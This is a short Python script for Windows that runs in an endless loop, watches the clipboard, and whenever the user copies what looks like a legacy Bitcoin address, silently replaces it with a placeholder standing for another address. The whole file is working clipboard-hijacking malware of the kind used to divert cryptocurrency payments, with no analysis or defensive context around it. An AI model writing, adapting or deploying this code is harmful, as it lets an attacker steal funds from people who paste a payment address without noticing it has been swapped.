#-*-coding: utf-8-*-
from win32clipboard import OpenClipboard
from win32clipboard import CloseClipboard
from win32clipboard import EmptyClipboard
from win32clipboard import SetClipboardText
from win32clipboard import GetClipboardData

def checkClipBoard():
	OpenClipboard()
	data = GetClipboardData()
	if len(data) == 34 and data[0] == "1": #detect if the user is copying a bitcoin address.
		EmptyClipboard()
		SetClipboardText("Your bitcoin address.")
	CloseClipboard()


def main():
	while True:
		checkClipBoard()


if __name__ == '__main__':
	main()